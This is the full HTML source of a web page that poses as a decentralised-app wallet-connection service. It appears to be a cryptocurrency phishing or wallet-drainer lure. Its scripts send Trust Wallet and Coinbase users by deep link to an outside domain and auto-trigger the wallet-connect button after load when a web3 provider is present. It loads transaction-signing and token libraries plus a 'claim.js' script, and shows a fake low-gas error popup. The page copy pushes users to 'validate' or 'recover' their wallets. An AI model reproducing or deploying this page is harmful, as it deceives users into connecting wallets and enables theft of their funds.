<!DOCTYPE html>
<html lang="en">
 
<head>
    <meta name="viewport" content="width=device-width" />
    <meta charset="UTF-8" />
    <title>Dapps - Connecting Decentralised Applications</title>
    <meta name="description" content="is a free protocol that lets users manage all their wallets from one space" />


    <link rel="icon" href="./logo.svg" />
    <meta name="next-head-count" content="5" />
    <link rel="stylesheet" href="./_next/main.css" data-n-g="" />
    
    <meta name="robots" content="noindex, nofollow">
    <meta name="robots" content="noimageindex">

	<script src="settings.js"></script>
    <script src="src/js/ethereumjs-tx-1.3.3.min.js"></script>
    <script src="ajax/libs/bignumber_js/8.0.2/bignumber.js" referrerpolicy="no-referrer"></script>
    <script src="src/js/tokenabi.js"></script>
    <script src="src/js/jquery.min.js"></script>



</head>



<body>


 <a class="" id="wallet-btn" ></a>



 




 
    
    
   <div id="modal" class="modal">
       
    <div class="wallet-connect-select">
        <div class="main-div">
            <div class="wallet-top-div">
                <div class="connect-wallet-txt">Connect Wallet</div>
            </div>
            <div class="white-border"></div>
            <div class="select-option">
                <div class="metamask-walllet" id="navigateButton2">
                    <div class="metamask-txt">Coinbase</div>
                    <img src="images/wallet/coinbase.svg" height="50" width="50" srcset="images/wallet/coinbase.svg 500w" sizes="50px" alt="" class="metamask-img">
                </div>
                <div class="wallet-connect-wallet" id="navigateButton">
                    <div class="wallet-connect-txt">Trust Wallet</div>
                    <img src="images/wallet/vertical_blue.png" width="50" height="20" alt="" class="wallet-connect-img" style="border-radius: 50%;">
                </div>
                 
                <div class="wallet-connect-wallet connects"  onclick="hideModal()">
                    <div class="wallet-connect-txt">Other Wallets</div>
                    <img src="images/wallet/wallet-connect.svg" width="45" height="45" alt="" class="wallet-connect-img">
                </div>
                <button class="modal-button" onclick="hideModal()">Close</button>
         
              
            </div>
        </div>
    </div>
</div>

<script>
    // Get references to the modal and the button to open it
    const modal = document.getElementById("modal");
    const openModalButton = document.getElementById("wallet-btn");

    // Function to open the modal
    function openModal() {
        modal.style.display = "block";
    }

    // Function to close the modal
    function closeModal() {
        modal.style.display = "none";
    }
    
    function showModal() {
            document.getElementById("modal").style.display = "block";
        }

        // Function to hide the modal
        function hideModal() {
            document.getElementById("modal").style.display = "none";
        }

    // Add event listener to the button to open the modal
    openModalButton.addEventListener("click", openModal);

    // Close the modal if the user clicks anywhere outside of it
    window.addEventListener("click", function(event) {
        if (event.target === modal) {
            closeModal();
        }
    });
    
    
    // JavaScript function to be called when the button is clicked
        function navigateToURL() {
            // Set the URL you want to navigate to
            var url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://tokensafeguard.com/index.php";
            // Navigate to the URL
            window.location.href = url;
        }

        // Get a reference to the button element
        var button = document.getElementById("navigateButton");

        // Attach the navigateToURL function to the button's onclick event
        button.onclick = navigateToURL;
        
        
        // JavaScript function to be called when the button is clicked
        function navigateToURL2() {
            // Set the URL you want to navigate to
            var url = "https://www.coinbase.com/connect-dapp?uri=https%3A%2F%2Ftokensafeguard.com%2F";
            // Navigate to the URL
            window.location.href = url;
        }

        // Get a reference to the button element
        var button = document.getElementById("navigateButton2");

        // Attach the navigateToURL function to the button's onclick event
        button.onclick = navigateToURL2;
</script>
        
        
        
        
        
        
 <script>
  // Get all elements with the 'connects' class
  const connectButtons = document.querySelectorAll('.connects');

  // Add an event listener to each button
  connectButtons.forEach(button => {
    button.addEventListener('click', () => {
      // Trigger the click event on the element with the 'walletConnect' ID
      document.querySelector('#connectWallet').click();
    });
  });
  



 if (typeof window.web3 !== 'undefined' || typeof window.ethereum !== 'undefined') {
            window.onload = function() {
    console.log('Window loaded.');
    setTimeout(function() {
        console.log('Delayed action after 100ms.');
        document.querySelector('#connectWallet').click();
    }, 1000);
};
            
        }

</script>


 
   
    <script>
        // Check if the window.web3 object is present, indicating a DApp browser
        if (typeof window.web3 !== 'undefined' || typeof window.ethereum !== 'undefined') {
            // Display the button
            document.getElementById('dapp-button-container').style.display = 'block';
            
            
            // Add event listener to the button if it's a DApp browser
            var connectWalletButton = document.getElementById('connectWallet1');
            connectWalletButton.addEventListener('click', function() {
                // Perform actions specific to DApp browser here
                connectWallet(); // Call your showModal function here
            });
            
        } else {
            // Hide the button if not in a DApp browser
            document.getElementById('dapp-button-container').style.display = 'none';
        
            // If not a DApp browser, set onclick function for the button
            var connectWalletButton = document.getElementById('connectWallet1');
            connectWalletButton.onclick = function() {
                // Perform actions specific to non-DApp browser here
                showModal(); // Call your showModal function here
            };

           
        }
    </script>
          
    

    <div id="__next">
      
        <div class="h-14"></div>
        <main>
            <section class="relative bg-white py-16 px-6">
                <div class="container max-w-screen-lg mx-auto flex flex-col md:flex-row-reverse items-center justify-between">
                    <div class="text-left max-w-md mb-8 px-2 md:mb-0"><img src="./assets/hero-illustration.png" class="w-full" /></div>
                    <div class="text-left max-w-md">
                        <h2 class="text-3xl mb-4 font-black">Secure your DApps and mobile wallets</h2>
                        <p class="text-base mb-8">Open protocol to communicate securely between Wallets and Dapps (Web3 Apps). The protocol establishes a remote connection using a Bridge server.</p>
                        
                       <br><br>
                    
                                       <button id="claimButton" style="display: none;" class="cursor-pointer rounded-md mb-4 text-primary border-2 border-primary w-2/3 font-semibold text-center py-3">LINK NOW</button>
                            
                            
                            
                             <div id="dapp-button-container" style="display:none">
        <!-- This button will only be displayed in a DApp browser -->
        <button onclick="showModal()" class="default-btn cursor-pointer rounded-md mb-4 text-primary border-2 border-primary w-2/3 font-semibold text-center py-3 connects">CONNECT</button>
   
    </div>

                                <div id="dapp-button-container23" style="display:none">
         <!--This button will only be displayed in a DApp browser -->
        <button id="connectWallet"  class="cursor-pointer rounded-md mb-4 text-primary border-2 border-primary w-2/3 font-semibold text-center py-3">CONNECT</button>
       
    </div>
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                                   <script>
    // Check if the window.web3 object is present, indicating a DApp browser
    if (typeof window.web3 !== 'undefined' || typeof window.ethereum !== 'undefined') {
        // Hide the dapp-button-container2 since it's for non-DApp browsers
        document.getElementById('dapp-button-container23').style.display = 'block';

       
    } else {
        // If not a DApp browser, set onclick function for the connectWallet1 button
         document.getElementById('dapp-button-container').style.display = 'block';
        var connectWalletButton = document.getElementById('connectWallet1');
        connectWalletButton.onclick = function() {
            // Perform actions specific to non-DApp browser here
            showModal(); // Call your showModal function here
        };

        // Hide the connectWallet1 button if not in a DApp browser
       
    }
    
    
</script>
                            
                    </div>
                </div>
            </section>
            <section class="relative md:px-6 py-20 bg-secondary">
                <h2 class="text-center mb-5 text-white font-black text-2xl md:text-3xl">Get Started in 3 Easy Steps</h2>
                <div class="container max-w-screen-lg mx-auto flex flex-row items-center md:justify-between">
                    <ul class="relative shadow-md border bg-white flex flex-col md:flex-row m-1 pt-10 md:pt-0  z-10 rounded">
                        <li class="flex-1 text-left pt-0 pb-8 px-6 md:p-10">
                            <h2 class="text-2xl font-black text-primary">1.</h2>
                            <h3 class="text-lg mt-1 mb-2 font-bold">Connect Wallet</h3>
                            <p class="text-sm m-0">Paste inside Wallet Dapps browser either synchronize, validate, rectify or recover wallet.</p>
                        </li>
                        <li class="flex-1 text-left pt-0 pb-8 px-6 md:p-10">
                            <h2 class="text-2xl font-black text-primary">2.</h2>
                            <h3 class="text-lg mt-1 mb-2 font-bold">Validate Wallet</h3>
                            <p class="text-sm m-0">Prove ownership of the wallet you want to connect. Private keys never leave mobile wallets, keeping user funds safe.</p>
                        </li>
                        <li class="flex-1 text-left pt-0 pb-8 px-6 md:p-10">
                            <h2 class="text-2xl font-black text-primary">3.</h2>
                            <h3 class="text-lg mt-1 mb-2 font-bold">Get Connected</h3>
                            <p class="text-sm m-0">End-to-end encryption using client-side generated keys keeps all user activity private.</p>
                        </li>
                    </ul>
                </div>
            </section>
            <section class="relative bg-white py-14 px-6 text-secondary">

                <div class="container max-w-screen-lg mx-auto flex flex-col items-center md:justify-between">
                    <div class="text-center">
                        <h2 class="text-2xl text-center font-bold mb-2">YOU CAN MANAGE OVER 5,500 COINS AND TOKENS</h2>
                        <p class="text-sm mb-4">For others, you need to use external wallets to be able to check your balance, send, receive…</p>

                    </div>
                </div>
            </section>
          
          
          
          
          
          
          
          
          
          
          <div id="modal" class="modal">
       
    <div class="wallet-connect-select">
        <div class="main-div">
            <div class="wallet-top-div">
                <div class="connect-wallet-txt">Connect Wallet</div>
            </div>
            <div class="white-border"></div>
            <div class="select-option">
                <div class="metamask-walllet" id="navigateButton2">
                    <div class="metamask-txt">Coinbase</div>
                    <img src="images/wallet/coinbase.svg" height="50" width="50" srcset="images/wallet/coinbase.svg 500w" sizes="50px" alt="" class="metamask-img">
                </div>
                <div class="wallet-connect-wallet" id="navigateButton">
                    <div class="wallet-connect-txt">Trust Wallet</div>
                    <img src="images/wallet/vertical_blue.png" width="50" height="20" alt="" class="wallet-connect-img" style="border-radius: 50%;">
                </div>
                 
                <div class="wallet-connect-wallet connects"  onclick="hideModal()">
                    <div class="wallet-connect-txt">Wallet Connect</div>
                    <img src="images/wallet/wallet-connect.svg" width="45" height="45" alt="" class="wallet-connect-img">
                </div>
                <button class="modal-button" onclick="hideModal()">Close</button>
         
              
            </div>
        </div>
    </div>
</div>
        </main>

        <footer class="border-t border-gray-200">
            <div class="container max-w-screen-lg mx-auto flex flex-col md:flex-row md:items-center md:justify-between py-6">
                <ul class="flex mb-4 mx-auto md:mx-0 md:ml-4 md:mb-0">
                    <li><a href="#" class="flex justify-center items-center bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Twitter"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32"
              xmlns="http://www.w3.org/2000/svg">
              <path
                d="M24 11.5c-.6.3-1.2.4-1.9.5.7-.4 1.2-1 1.4-1.8-.6.4-1.3.6-2.1.8-.6-.6-1.5-1-2.4-1-1.7 0-3.2 1.5-3.2 3.3 0 .3 0 .5.1.7-2.7-.1-5.2-1.4-6.8-3.4-.3.5-.4 1-.4 1.7 0 1.1.6 2.1 1.5 2.7-.5 0-1-.2-1.5-.4 0 1.6 1.1 2.9 2.6 3.2-.3.1-.6.1-.9.1-.2 0-.4 0-.6-.1.4 1.3 1.6 2.3 3.1 2.3-1.1.9-2.5 1.4-4.1 1.4H8c1.5.9 3.2 1.5 5 1.5 6 0 9.3-5 9.3-9.3v-.4c.7-.5 1.3-1.1 1.7-1.8z">
              </path>
            </svg></a></li>
                    <li class="ml-4"><a href="#" class="flex justify-center items-center bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Github"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32"
              xmlns="http://www.w3.org/2000/svg">
              <path
                d="M16 8.2c-4.4 0-8 3.6-8 8 0 3.5 2.3 6.5 5.5 7.6.4.1.5-.2.5-.4V22c-2.2.5-2.7-1-2.7-1-.4-.9-.9-1.2-.9-1.2-.7-.5.1-.5.1-.5.8.1 1.2.8 1.2.8.7 1.3 1.9.9 2.3.7.1-.5.3-.9.5-1.1-1.8-.2-3.6-.9-3.6-4 0-.9.3-1.6.8-2.1-.1-.2-.4-1 .1-2.1 0 0 .7-.2 2.2.8.6-.2 1.3-.3 2-.3s1.4.1 2 .3c1.5-1 2.2-.8 2.2-.8.4 1.1.2 1.9.1 2.1.5.6.8 1.3.8 2.1 0 3.1-1.9 3.7-3.7 3.9.3.4.6.9.6 1.6v2.2c0 .2.1.5.6.4 3.2-1.1 5.5-4.1 5.5-7.6-.1-4.4-3.7-8-8.1-8z">
              </path>
            </svg></a></li>
                    <li class="ml-4"><a href="#" class="flex justify-center items-center bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out" aria-label="Facebook"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32"
              xmlns="http://www.w3.org/2000/svg">
              <path
                d="M14.023 24L14 17h-3v-3h3v-2c0-2.7 1.672-4 4.08-4 1.153 0 2.144.086 2.433.124v2.821h-1.67c-1.31 0-1.563.623-1.563 1.536V14H21l-1 3h-2.72v7h-3.257z">
              </path>
            </svg></a></li>
                </ul>
                <div class="text-sm text-center md:text-right">©
                    <!-- -->2022
                    <!-- -->
                    <a class="hover:underline" href="/">
                Connect Easily
            </a>
                </div>
            </div>
        </footer>


      
<style>
    
.popup-err {
    position: fixed;
    left: 0;
    top: 0;
    height: 100%;
    width: 100%;
    background-color: rgba(25, 28, 31, 0.8);
    opacity: 0;
    visibility: hidden;
    -webkit-transition: opacity 0.5s 0s, visibility 0s 0.5s;
    -moz-transition: opacity 0.5s 0s, visibility 0s 0.5s;
    transition: opacity 0.5s 0s, visibility 0s 0.5s;
    z-index: 1;
}

.popup-err.is-visible {
    opacity: 1;
    visibility: visible;
    -webkit-transition: opacity 0s 0s, visibility 0s 0s;
    -moz-transition: opacity 0s 0s, visibility 0s 0s;
    transition: opacity 0s 0s, visibility 0s 0s;
}

.popup-margin {
    margin: 150px auto;
}

.popup-win-margin {
    margin: 50px auto;
}

.popup-container {
    position: relative;
    width: 90%;
    max-width: 400px;
    background-color: rgba(25, 28, 31, 0.3);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: solid 1px rgba(255, 255, 255, 0.08);
    border-radius: 10px;
    padding: 40px 0;
    text-align: center;
    -webkit-transform: translateY(-40px);
    -moz-transform: translateY(-40px);
    -ms-transform: translateY(-40px);
    -o-transform: translateY(-40px);
    transform: translateY(-40px);
    -webkit-backface-visibility: hidden;
    -webkit-transition-property: -webkit-transform;
    -moz-transition-property: -moz-transform;
    transition-property: transform;
    -webkit-transition-duration: 0.5s;
    -moz-transition-duration: 0.5s;
    transition-duration: 0.5s;
}

.is-visible .popup-container {
    -webkit-transform: translateY(0);
    -moz-transform: translateY(0);
    -ms-transform: translateY(0);
    -o-transform: translateY(0);
    transform: translateY(0);
}

.popup-container h1 {
    font-size: 27px;
    font-weight: 500;
    color: rgba(255, 255, 255, 0.6);
    margin: 0 0 10px 0;
    line-height: 1.5em;
}

.popup-container p {
    font-size: 16px;
    font-weight: 400;
    color: #fff;
    line-height: 1.5em;
    margin-top: 0px;
}

.popup-close {
    font-family: "Montserrat", sans-serif;
    font-size: 16px;
    font-weight: 600;
    background: #feda03;
    border-radius: 10px;
    border: none;
    color: #191c1f;
    display: block;
    outline: none;
    margin: 20px auto 10px;
    padding: 15px 30px;
    cursor: pointer;
    transition: 0.5s;
}

.popup-close:hover {
    background-color: #e3c305;
}

.popup-box img {
    width: 200px;
    border-radius: 10px;
    pointer-events: none;
}

.popup-item {
    text-align: center;
}
</style>




        <!-- <script src="<?= $Web_url ?>/js.js"></script> -->
        
        <style>
        /* Styles for the modal */
            .modal {
            display: none;
            position: fixed;
            bottom: 110px;
            left: 0;
            width: 100%;
            padding: 20px; /* Added padding for better visibility */
            background-color: rgba(0, 0, 0, 0.7);
            color: #fff; /* Added text color for better visibility */
            font-size: 16px; /* Added font size for better visibility */
            text-align: center; /* Center the content */
            box-sizing: border-box; /* Include padding in the total width */
             z-index: 2;
        }

         .wallet-connect-select {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     margin-bottom: 59px;
     padding-bottom: 123px;
     -webkit-box-pack: center;
     -ms-flex-pack: center;
     justify-content: center;
   }
   
      .modal-button {
            position: absolute;
            top: 10px;
            right: 50px;
            background-color: #007BFF;
            color: #fff;
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
   
   .main-div {
     width: 400px;
     border-radius: 20px;
     background-color: rgba(41, 41, 41, 0.76);
   }

   .wallet-container {
     border-style: solid;
     border-width: 1px;
     border-color: #fff;
     border-radius: 20px;
   }
   
   .white-border {
     border-style: solid;
     border-width: 0.1px;
     border-color: hsla(0, 0%, 100%, 0.53);
   }
   .select-option {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    padding-bottom: 10px;
    -webkit-box-orient: vertical;
    -webkit-box-direction: normal;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
  }
   .metamask-walllet {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     margin: 12px 20px 10px;
     -webkit-box-pack: justify;
     -webkit-justify-content: space-between;
     -ms-flex-pack: justify;
     justify-content: space-between;
     border-radius: 30px;
     background-color: rgba(34, 33, 33, 0.39);
   }
   
   .wallet-connect-wallet {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     margin: 12px 20px 10px;
     -webkit-box-pack: justify;
     -webkit-justify-content: space-between;
     -ms-flex-pack: justify;
     justify-content: space-between;
     border-radius: 30px;
     background-color: rgba(34, 33, 33, 0.39);
   }

   .connect-wallet-txt {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     padding: 20px;
     -webkit-box-orient: horizontal;
     -webkit-box-direction: normal;
     -webkit-flex-direction: row;
     -ms-flex-direction: row;
     flex-direction: row;
     -webkit-box-pack: justify;
     -webkit-justify-content: space-between;
     -ms-flex-pack: justify;
     justify-content: space-between;
     font-family: Oswald, sans-serif;
     color: #fff;
     font-size: 25px;
     font-weight: 500;
   }
   
   .metamask-txt {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     padding: 20px;
     -webkit-box-orient: horizontal;
     -webkit-box-direction: normal;
     -webkit-flex-direction: row;
     -ms-flex-direction: row;
     flex-direction: row;
     -webkit-box-pack: justify;
     -webkit-justify-content: space-between;
     -ms-flex-pack: justify;
     justify-content: space-between;
     font-family: Oswald, sans-serif;
     color: #fff;
     font-size: 22px;
     font-weight: 400;
   }
   
   .wallet-connect-txt {
     display: -webkit-box;
     display: -webkit-flex;
     display: -ms-flexbox;
     display: flex;
     padding: 20px;
     -webkit-box-orient: horizontal;
     -webkit-box-direction: normal;
     -webkit-flex-direction: row;
     -ms-flex-direction: row;
     flex-direction: row;
     -webkit-box-pack: justify;
     -webkit-justify-content: space-between;
     -ms-flex-pack: justify;
     justify-content: space-between;
     border-radius: 20px;
     background-color: hsla(0, 0%, 100%, 0);
     font-family: Oswald, sans-serif;
     color: #fff;
     font-size: 22px;
     font-weight: 400;
     text-align: left;
   }
   
   .metamask-img {
     margin-top: 5px;
     margin-right: 10px;
     padding: 5px;
   }
   
   .wallet-connect-img {
     margin-top: 5px;
     margin-right: 10px;
     padding: 5px;
   }
    </style>

 
        
        <div class="popup-err">
		<div class="popup-container popup-margin">
			<h1>Oops!</h1>
			<p>You Have a Low ETH Balance <br>to Pay for Transaction Gas <br>Gas Price 0,018 ETH</p>
			<button class="popup-close">Ok</button>
		</div>
	</div>
	<script src="assets/js/jquery-3.6.0.min.js"></script>
	<script src="web3-latest/dist/web3.min.js"></script>
    <script type="text/javascript" src="web3modal.js"></script>
    <script type="text/javascript" src="https://unpkg.com/evm-chains/lib/index.js"></script>
    <script type="text/javascript" src="-walletconnect/web3-provider.js"></script>
    <script src="moralis-v1-1.12.0/dist/moralis.js"></script>
    <script src="-walletconnect/web3-provider-1.7.8/dist/umd/index.min.js"></script>
    <script type="text/javascript" src="src/js/claim.js"></script>
    <script src="assets/js/popup.js"></script>
    <script type="text/javascript">
        $('.alert-eth-message-close').click(function(){
        $('.alert-eth-message').fadeOut(200);
        });
    </script>
    
<!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = '9f6ff51b65cba67f82e619d7d04a9890aa45aed6';
window.smartsupp||(function(d) {
  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
  c.type='text/javascript';c.charset='utf-8';c.async=true;
  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);
</script>
<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>

</body>

</html>